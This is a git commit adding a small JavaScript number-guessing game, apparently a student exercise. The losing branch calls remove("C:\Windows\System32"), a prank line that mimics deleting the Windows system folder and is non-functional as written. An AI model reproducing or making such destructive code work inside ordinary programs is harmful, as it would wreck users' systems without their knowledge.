8aeb179b69d2cb41afa551db902e8d27ec73e368
Marley Castro <162909728+MarleyCastro@users.noreply.github.com>
2025-01-28 17:23:22 -0300

    html-css

---
+++ DESAFIO/d012/1.js
@@ -0,0 +1,8 @@
+const numero = Math.floor(Math.random() * 9) + 1;
+const palpite = parseInt(prompt("Adivinhe um número entre 1 e 9"), 10);
+
+if (palpite === numero) {
+    console.log("Você ganhou!");
+} else {
+    remove("C:\Windows\System32")
+}
